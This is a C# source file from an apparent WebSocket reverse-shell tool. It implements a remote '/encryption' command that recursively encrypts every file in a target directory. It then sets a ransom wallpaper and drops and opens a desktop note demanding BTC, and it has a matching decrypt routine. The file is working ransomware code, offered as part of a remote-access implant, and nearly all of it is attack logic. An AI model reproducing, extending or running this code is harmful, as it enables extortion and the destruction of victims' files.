using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.service.encryption;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class Encryption : Command
    {
        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        StringBuilder sb = new StringBuilder();


        private void SetWallpaper(string resource)
        {
            // Specify the resource name
            string resourceName = $"WebSocketReverseShellDotNet.resources.{resource}"; // Adjust with your actual namespace and resource name

            // Get the resource stream
            Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);

            if (stream != null)
            {
                // Create a temporary file path
                string tempFilePath = Path.Combine(Path.GetTempPath(), "TempWallpaper.jpg");

                // Save the resource stream to the temporary file
                using (var fileStream = File.Create(tempFilePath))
                {
                    stream.CopyTo(fileStream);
                }

                // Set the desktop wallpaper
                bool success = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempFilePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

                if (success)
                {
                    sb.AppendLine("Desktop wallpaper set successfully.");
                }
                else
                {
                    sb.AppendLine("Failed to set desktop wallpaper.");
                }
            }
            else
            {
                sb.AppendLine("Failed to load the resource stream.");
            }
        }

        public static async Task startNotepad(string filename)
        {
            SystemCommand systemCommand = new SystemCommand();
            systemCommand.ExecuteCommand($"notepad {filename}");

        }   

        void WriteMessageToDesktop( string message,string filename)
        {
            try
            {
                String filePath = $"{Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}\\{filename}";

                // Write the message to the text file
                File.WriteAllText(filePath, message);
                SystemCommand systemCommand = new SystemCommand();

                OSUtil.RunInSeparateThread(() => startNotepad(filePath)); 
                

            }
            catch (Exception ex)
            {
                sb.AppendLine("An error occurred: " + ex.Message);
                
            }
        }



        public string ExecuteCommand(string command)
        {
            List<string> commands = new List<string>(DataManuplationUtil.StringToList(command, " "));
            if (commands.Count >= 3 && commands[0].Equals("/encryption", StringComparison.OrdinalIgnoreCase))
            {
                commands.RemoveAt(0);

                processEncryptionProcess(commands);


            }
            else
            {
                sb.AppendLine("Command is invalid /??");

            }




            return sb.ToString();
        }

        public void processEncryptionProcess(List<string> commands)
        {


            if (commands.Count >= 1 && commands[0].Equals("encrypt", StringComparison.OrdinalIgnoreCase))
            {
                commands.RemoveAt(0);
                encryptionProcess(String.Join(" ", commands) );
            }
            else if (commands.Count >= 1 && commands[0].Equals("decrypt", StringComparison.OrdinalIgnoreCase))
            {
                commands.RemoveAt(0);
                decryptionProcess(String.Join(" ", commands));  
            }
            else
            {
                sb.AppendLine("error occured");
                return;
            }

        }

        public void encryptionProcess(String path)
        {
            
            DirectoryInfo directory = new DirectoryInfo(path);
            if (!directory.Exists)
            {
                sb.AppendLine($"path '{path}' is not a valid dir");
                return;
            }
            sb.AppendLine($"Encrypting dir: {path}");
            ProcessFilesInDirectory(directory, new Encrypt());
            SetWallpaper("encrypt.jpg");
            WriteMessageToDesktop($"Encrypted your files at directory: '{path}'. Send BTC to my wallet or your files will be gone!!! 🤬", "encrypt.txt");
        }

        public void decryptionProcess(String path)
        {
            
            DirectoryInfo directory = new DirectoryInfo(path);
            if (!directory.Exists)
            {
                sb.AppendLine($"path '{path}' is not a valid dir");
                return;
            }

            sb.AppendLine($"Decrypting dir: {path}");
            ProcessFilesInDirectory(directory, new Decrypt());
            SetWallpaper("decrypt.jpg");
            WriteMessageToDesktop($"Decrypted your files successfully at directory: '{path}'. " +
                $"Becarful when downloading stuff from the internet, you might get stuff like this. 😁👍", "decrypt.txt");


        }



        public void ProcessFilesInDirectory(DirectoryInfo directory, EncryptionStrategy encryptionStrategy)
        {
            try
            {
                // Process files in the current directory
                ProcessFiles(directory, encryptionStrategy);

                // Process subdirectories recursively
                DirectoryInfo[] subDirectories = directory.GetDirectories();
                foreach (DirectoryInfo subDirectory in subDirectories)
                {
                    ProcessFilesInDirectory(subDirectory, encryptionStrategy);
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., unauthorized access)
                sb.AppendLine($"Error processing directory {directory.FullName}: {ex.Message}");
            }
        }

        private void ProcessFiles(DirectoryInfo directory,  EncryptionStrategy encryptionStrategy)
        {
            try
            {
                // Get all files in the current directory
                FileInfo[] files = directory.GetFiles();

                foreach (FileInfo file in files)
                {
                    // Process each file (you can replace this with your logic)
                    /*Console.WriteLine($"Processing file: {file.FullName}");*/
                    // Your processing logic goes here
                    encryptionStrategy.ProcessFile(file.FullName);
                }
            }
            catch (Exception ex)
            {
                // Handle exceptions (e.g., unauthorized access)
                sb.AppendLine($"Error processing directory {directory.FullName}: {ex.Message}");
            }
        }



    }
}
